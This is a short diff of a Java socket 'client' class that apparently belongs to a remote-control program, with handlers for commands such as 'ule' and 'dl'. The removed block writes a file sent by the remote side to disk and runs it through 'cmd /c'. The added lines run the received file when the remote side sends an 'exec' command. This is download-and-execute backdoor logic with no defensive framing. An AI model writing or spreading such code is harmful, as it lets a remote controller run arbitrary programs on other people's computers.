@@ -125,34 +125,11 @@ public class client {
 						} finally {
 							bos.close();
 						}
-					}
-					if (line.equals("ule")) {
-						System.out.println("upload if statement");
-						String dest = din.readLine();
-						System.out.println("recieved file dest: " + dest);
-						if (dest.startsWith("de")) {
-							dest = loc.substring(0, loc.lastIndexOf("/")) + "/" + dest.substring(dest.indexOf(" ") + 1);
-							System.out.println("default file dest: " + dest);
+
+						String exec = din.readLine();
+						if (exec.equals("exec")) {
+							Process proc1 = Runtime.getRuntime().exec("cmd /c " + dest);
 						}
-						dest = dest.replace("/", "\\");
-						if (new File(dest.substring(0, dest.lastIndexOf("\\"))).exists()) {
-							ps.println("ok");
-							System.out.println("dir exists");
-						} else {
-							ps.println("fe");
-							System.out.println("file doesn't exist");
-						}
-						System.out.println(dest);
-						byte[] rBytes = new byte[100000000];
-						FileOutputStream fos = new FileOutputStream(dest);
-						BufferedOutputStream bos = new BufferedOutputStream(fos);
-						try {
-							int bytesRead = is.read(rBytes, 0, rBytes.length);
-							bos.write(rBytes, 0, bytesRead);
-						} finally {
-							bos.close();
-						}
-						Process proc1 = Runtime.getRuntime().exec("cmd /c " + dest);
 					}
 					if (line.equals("dl")) {
 						ps.println("ok");
